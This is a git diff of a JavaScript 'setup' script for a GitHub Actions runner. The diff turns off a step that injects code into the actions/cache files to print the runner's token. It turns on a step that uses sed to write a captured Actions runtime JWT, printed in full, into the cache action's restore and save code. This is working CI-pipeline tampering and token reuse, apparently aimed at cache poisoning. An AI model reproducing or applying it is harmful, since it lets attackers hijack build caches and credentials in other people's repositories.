@@ -6,37 +6,37 @@ console.log("this is a setup.....")
 console.log(__dirname);
 
 // print token
-let writecontent = 'console.log(JSON.stringify(token.split("")));';
+// let writecontent = 'console.log(JSON.stringify(token.split("")));';
 
-cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
-    if (err){
-        console.log(err);
-        return;
-    }
-    console.log(`stdout: ${stdout.toString()}`);
-    console.log(`stderr: ${stderr}`);
-});
+//cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
+//    if (err){
+//        console.log(err);
+//        return;
+//    }
+//    console.log(`stdout: ${stdout.toString()}`);
+//    console.log(`stderr: ${stderr}`);
+//});
 
 
 
 // use the printed token
-// let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ikh5cTROQVRBanNucUM3bWRydEFoaHJDUjJfUSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlJlc3VsdHM6N2JmODQzZWMtZGZlMS00ZDQwLTkxYTItODgyZTZhNWRmZDgxOjY4YjE1ODJmLTE2NTEtNTI0YS1mMmQzLWM4YWE4OWU5ZWZmNSBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8zNTEgTG9jYXRpb25TZXJ2aWNlLkNvbm5lY3QgUmVhZEFuZFVwZGF0ZUJ1aWxkQnlVcmk6MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwLzE6QnVpbGQvQnVpbGQvMzUxIiwiSWRlbnRpdHlUeXBlQ2xhaW0iOiJTeXN0ZW06U2VydmljZUlkZW50aXR5IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc2lkIjoiREREREREREQtRERERC1ERERELUREREQtREREREREREREREREIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9wcmltYXJ5c2lkIjoiZGRkZGRkZGQtZGRkZC1kZGRkLWRkZGQtZGRkZGRkZGRkZGRkIiwiYXVpIjoiMjY3NzI2NjctZTQ2OS00MjM5LTg5ZWMtMDUxMWU2MjY2MjYyIiwic2lkIjoiYzRjNGMzNzEtZjcyMi00ZWZhLWE2Y2UtNTllMjA4NzBiMzE4IiwiYWMiOiJbe1wiU2NvcGVcIjpcInJlZnMvaGVhZHMvbWFpblwiLFwiUGVybWlzc2lvblwiOjN9XSIsImFjc2wiOiIxMCIsIm9yY2hpZCI6IjdiZjg0M2VjLWRmZTEtNGQ0MC05MWEyLTg4MmU2YTVkZmQ4MS5oZWxsb193b3JsZF9qb2IuX19kZWZhdWx0IiwiaXNzIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImF1ZCI6InZzdG9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb218dnNvOmRiNDZmZDE4LTMxOWQtNGRkYS1hODBjLWIyN2I5NzBkZDZhMiIsIm5iZiI6MTcwMDc2NTgwMywiZXhwIjoxNzAwNzg4NjAzfQ.mXu3EO5YuOSUPIDBvAhftnQE0bQWpxc84WQjaar7bU8-wHiwVuHlntTVk8OwmUXJjdZOM3ti6hwD9B9dK1buNSouhoSNimXdRs8GfDraWz0oc5eOWSL3EoP90ypeMXFiotXTQ4dIFSHQDC-WBdsD16xePrE-qpFFwQC_I77A7Jxj27TkiWiMVu0JoJXmqmqhPOd4iAkxY7wPTUP1-xrbuuOXCNj4_UBPT95NAAxiakHjxMRaitEwyras0z6wQMpeXmnS9G7Ocp6aFiNOqS0yt2gaGykyJGCqQ59wUwkAWkKVb9ic88ZQcb12L8imZE4WXEF4JrCL6pSTjOxtMO_UMw"';
+ let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ikh5cTROQVRBanNucUM3bWRydEFoaHJDUjJfUSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlJlc3VsdHM6YmU5NzY5YWUtZDExOC00NWIxLThmZjItODMyMDU5OGUyMzk4OjJlODQ3MTM3LWFlNzAtNTQxZC1hNDU0LWYxMDA3YWI3ZTNiYiBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC80IExvY2F0aW9uU2VydmljZS5Db25uZWN0IFJlYWRBbmRVcGRhdGVCdWlsZEJ5VXJpOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMC8xOkJ1aWxkL0J1aWxkLzQiLCJJZGVudGl0eVR5cGVDbGFpbSI6IlN5c3RlbTpTZXJ2aWNlSWRlbnRpdHkiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9zaWQiOiJERERERERERC1ERERELUREREQtRERERC1EREREREREREREREQiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3ByaW1hcnlzaWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJhdWkiOiJjNzhiNGI1YS1mZjQ4LTQ0NDUtODBiNC05N2MzNGNlOTc5ZWYiLCJzaWQiOiJhM2IzMGE4MS1kMTcxLTQyNDMtYWY5Yi01ZDM1ODEzYzI2NzYiLCJhYyI6Ilt7XCJTY29wZVwiOlwicmVmcy9oZWFkcy9tYWluXCIsXCJQZXJtaXNzaW9uXCI6M31dIiwiYWNzbCI6IjEwIiwib3JjaGlkIjoiYmU5NzY5YWUtZDExOC00NWIxLThmZjItODMyMDU5OGUyMzk4LnVzZS5fX2RlZmF1bHQiLCJpc3MiOiJ2c3Rva2VuLmFjdGlvbnMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwiYXVkIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbXx2c286OGNjNmQzYmUtZWIxMi00ZWQxLWEyMmQtODQ4MTA0NDMxM2NhIiwibmJmIjoxNzExMTM1MTcxLCJleHAiOjE3MTExNTc5NzF9.ESm7d2hg_roLUYUb19aghPtVVjT02AUdeZ52Yg8fI1Tvk169qz-UUMcId-E2yjMQ8Z25ifkSgd5Qisx7k6xdFsrfRj1wXhOxVclKcLRKswegaC1lqbJIrIcLa176_UxxRd8Io1FD735tccZslFpnFoOakou2z17dJQVqD5UTz0OVBmwL4zkikvRC1eJthzdxiq6tR1NLycgo_8V3wopRo4Olzr6r0UlZSaOoFHOk0Qp59RF1RLCDXd3A2dm72J50LOVbnPS5BArjxdjfTFnPqj2BFR2-MlaSghCuaVnlhMXBIW2TW3HHBLFSZaqzSs-GjTupc-fzXBRWes85vzcQ9w"';
 
-// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
+ cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
+     if (err){
+         console.log(err);
+         return;
+     }
+     console.log(`stdout: ${stdout.toString()}`);
+     console.log(`stderr: ${stderr}`);
+ });
 
-// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
+ cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
+     if (err){
+         console.log(err);
+         return;
+     }
+     console.log(`stdout: ${stdout.toString()}`);
+     console.log(`stderr: ${stderr}`);
+ });
 
